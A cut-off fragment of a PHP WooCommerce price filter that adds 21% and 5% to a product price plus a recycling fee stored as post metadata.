    $ecotasa = (float)get_post_meta($post_id, 'cfa_taxamountrecycling')[0];
    
    $price = $price+($price*0.21)+($price*0.05); // add 21% and 5%

    if(!is_null($ecotasa))
    {
        if(is_numeric($ecotasa))
        {
            $price = $price + $ecotasa;
        }
    }

    return $price;
}

add_filter('woocommerce_get_price', 'return_custom_price', 10, 2);